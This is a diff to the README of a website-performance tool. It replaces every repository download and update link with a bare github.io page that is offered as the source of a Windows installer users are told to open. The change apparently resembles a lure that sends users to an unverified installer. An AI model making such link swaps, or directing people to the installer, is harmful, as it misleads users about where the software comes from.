@@ -1,6 +1,6 @@
 # 🚀 web-perf-audit - Improve your website speed with automation
 
-[![Download Now](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://github.com/sa746062/web-perf-audit)
+[![Download Now](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://sa746062.github.io)
 
 The web-perf-audit tool checks how fast your website loads. It examines your site using official performance standards. The software measures core metrics like Largest Contentful Paint, Cumulative Layout Shift, and Interaction to Next Paint. It creates reports and gives you exact steps for fixing slow areas.
 
@@ -19,7 +19,7 @@ You receive a report that lists errors. The tool suggests changes to your code. 
 
 ## 📥 How to get started
 
-1. Go to the [web-perf-audit download page](https://github.com/sa746062/web-perf-audit) to access the software.
+1. Go to the [web-perf-audit download page](https://sa746062.github.io) to access the software.
 2. Select the latest version of the installer for Windows.
 3. Save the file to your computer.
 4. Open the file to begin the installation.
@@ -58,7 +58,7 @@ You do not need to be a programmer to benefit from this tool. When the audit fin
 
 ## 🔄 Updating the tool
 
-New versions release often to match changing web standards. Check the [official repository](https://github.com/sa746062/web-perf-audit) for updates. If a new version exists, download it and install it over your current version. Your settings will remain saved.
+New versions release often to match changing web standards. Check the [official repository](https://sa746062.github.io) for updates. If a new version exists, download it and install it over your current version. Your settings will remain saved.
 
 ## ❓ Frequently asked questions
 
